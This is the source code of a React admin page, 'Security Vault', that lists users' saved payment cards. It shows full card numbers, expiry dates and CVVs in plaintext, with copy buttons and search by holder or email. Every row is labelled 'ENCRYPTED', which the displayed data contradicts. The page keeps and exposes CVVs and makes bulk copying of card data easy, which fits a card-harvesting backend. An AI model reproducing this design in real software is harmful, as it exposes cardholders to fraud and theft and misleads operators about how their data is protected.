'use client';
import { useEffect, useState } from 'react';
import AdminPanelLayout from '@/components/AdminPanelLayout';
import { CreditCard, User, Mail, Calendar, Search, RefreshCw, ShieldCheck } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const CopyButton = ({ text, title }) => {
    const [copied, setCopied] = useState(false);
    const handleCopy = () => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };
    return (
        <button 
            onClick={handleCopy}
            className="p-1 px-2 bg-gray-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 rounded-md transition-all text-gray-500 hover:text-black dark:text-zinc-400 dark:hover:text-white flex items-center gap-1.5"
            title={title}
        >
            {copied ? <ShieldCheck size={12} className="text-green-500" /> : <RefreshCw size={12} />}
            <span className="text-[10px] font-bold uppercase">{copied ? 'Copied' : 'Copy'}</span>
        </button>
    );
};

export default function AdminCardsPage() {
    const [cards, setCards] = useState([]);
    const [loading, setLoading] = useState(true);
    const [searchTerm, setSearchTerm] = useState('');
    const [refreshing, setRefreshing] = useState(false);

    const fetchCards = async (silent = false) => {
        if (!silent) setLoading(true);
        else setRefreshing(true);
        try {
            const res = await fetch('/api/admin/cards');
            const data = await res.json();
            if (data.success) {
                setCards(data.cards);
            }
        } catch (error) {
            console.error("Failed to fetch cards", error);
        } finally {
            setLoading(false);
            setRefreshing(false);
        }
    };

    useEffect(() => {
        fetchCards();
    }, []);

    const filteredCards = cards.filter(card => 
        card.cardHolder?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        card.userName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        card.userEmail?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        card.cardNumber?.includes(searchTerm)
    );

    return (
        <AdminPanelLayout>
            <div className="space-y-8 pb-12">
                <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                    <div className="flex items-center gap-4">
                        <div className="w-14 h-14 bg-zinc-900 dark:bg-white rounded-2xl flex items-center justify-center text-white dark:text-black shadow-xl shadow-black/10 shrink-0">
                            <ShieldCheck size={32} />
                        </div>
                        <div>
                            <h1 className="text-4xl font-black tracking-tight anta-regular dark:text-white">Security Vault</h1>
                            <p className="text-gray-500 dark:text-gray-400 mt-0.5 font-medium">Monitoring encrypted payment assets.</p>
                        </div>
                    </div>
                    <div className="flex items-center gap-3">
                        <button 
                            onClick={() => fetchCards(true)}
                            className="flex items-center gap-2 px-5 py-3 bg-white dark:bg-zinc-900 border border-gray-200 dark:border-white/5 rounded-2xl hover:bg-gray-50 dark:hover:bg-zinc-800 transition-all font-bold text-sm shadow-xl shadow-black/5"
                        >
                            <RefreshCw size={18} className={`${refreshing ? 'animate-spin' : ''} text-blue-600`} />
                            {refreshing ? 'Syncing...' : 'Sync Vault'}
                        </button>
                    </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
                    <div className="lg:col-span-3 relative group">
                       
                        <input 
                            type="text" 
                            placeholder="Search by holder, email, or card number..." 
                            className="w-full pl-14 pr-6 py-5 bg-white dark:bg-zinc-900 border border-gray-200 dark:border-white/5 rounded-[24px] outline-none transition-all shadow-xl shadow-black/5 dark:text-white font-medium focus:border-blue-500/50"
                            value={searchTerm}
                            onChange={(e) => setSearchTerm(e.target.value)}
                        />
                    </div>
                    <div className="bg-white dark:bg-zinc-900 border border-gray-100 dark:border-white/5 p-6 rounded-[24px] flex flex-col justify-center items-center shadow-xl shadow-black/5">
                        <span className="text-4xl font-black text-blue-600">{filteredCards.length}</span>
                        <span className="text-[10px] font-black uppercase tracking-[0.2em] mt-2 opacity-50">Saved Cards</span>
                    </div>
                </div>

                <div className="bg-white dark:bg-zinc-900 rounded-4xl border border-gray-100 dark:border-white/5 shadow-2xl shadow-black/5 overflow-hidden">
                    <div className="overflow-x-auto">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="bg-gray-50/50 dark:bg-white/2 border-b border-gray-100 dark:border-white/5 whitespace-nowrap">
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400">Card Holder</th>
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400">Card Number</th>
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400 text-center">Exp / CVV</th>
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400">Linked User</th>
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400 text-right">Added At</th>
                                    <th className="px-6 py-5 text-[10px] font-black uppercase tracking-widest text-zinc-400 text-center">Security</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-50 dark:divide-white/2">
                                {loading ? (
                                    [...Array(5)].map((_, i) => (
                                        <tr key={i} className="animate-pulse">
                                            <td colSpan="6" className="px-6 py-8">
                                                <div className="h-4 bg-gray-100 dark:bg-zinc-800 rounded-full w-full opacity-50"></div>
                                            </td>
                                        </tr>
                                    ))
                                ) : filteredCards.length === 0 ? (
                                    <tr>
                                        <td colSpan="6" className="px-6 py-20 text-center text-zinc-400 font-bold italic">No records found in the Security Vault.</td>
                                    </tr>
                                ) : filteredCards.map((card, idx) => (
                                    <tr key={card._id || idx} className="group hover:bg-gray-50/50 dark:hover:bg-white/1 transition-all duration-200">
                                        <td className="px-6 py-6">
                                            <div className="flex items-center gap-3">
                                                <div className="w-8 h-8 rounded-full bg-linear-to-br from-blue-600 to-indigo-600 flex items-center justify-center text-white text-[10px] font-black shadow-lg shadow-blue-600/20">
                                                    {card.cardHolder?.slice(0, 1) || 'C'}
                                                </div>
                                                <span className="font-extrabold text-sm tracking-tight">{card.cardHolder || 'VALUED CUSTOMER'}</span>
                                            </div>
                                        </td>
                                        <td className="px-6 py-6">
                                            <div className="flex items-center gap-3">
                                                <code className="text-[11px] font-black tracking-widest text-zinc-600 dark:text-zinc-300 bg-gray-100 dark:bg-zinc-800 px-2 py-1 rounded-lg">
                                                    {card.cardNumber?.replace(/\d{4}(?=.)/g, '$& ')}
                                                </code>
                                                <CopyButton text={card.cardNumber} title="Copy Card Number" />
                                            </div>
                                        </td>
                                        <td className="px-6 py-6 text-center">
                                            <div className="inline-flex items-center gap-2 bg-zinc-100 dark:bg-zinc-800 px-3 py-1.5 rounded-xl border border-zinc-200 dark:border-white/5">
                                                <span className="text-[11px] font-black text-zinc-500">{card.expiry || '--/--'}</span>
                                                <div className="w-px h-3 bg-zinc-300 dark:bg-zinc-700"></div>
                                                <span className="text-sm font-black text-blue-600 dark:text-blue-400 font-mono tracking-tighter">{card.cvv || '***'}</span>
                                            </div>
                                        </td>
                                        <td className="px-6 py-6">
                                            <div className="flex flex-col">
                                                <span className="text-xs font-bold">{card.userName}</span>
                                                <span className="text-[10px] text-zinc-400 font-medium truncate max-w-[150px]">{card.userEmail}</span>
                                            </div>
                                        </td>
                                        <td className="px-6 py-6 text-right">
                                            <span className="text-xs text-zinc-500 font-medium">{card.savedAt}</span>
                                        </td>
                                        <td className="px-6 py-6 text-center">
                                            <div className="flex items-center justify-center">
                                                <div className="flex items-center gap-1.5 text-[9px] font-black text-green-500 bg-green-500/10 px-3 py-1.5 rounded-full border border-green-500/20 whitespace-nowrap">
                                                    <ShieldCheck size={10} /> ENCRYPTED
                                                </div>
                                            </div>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </AdminPanelLayout>
    );
}
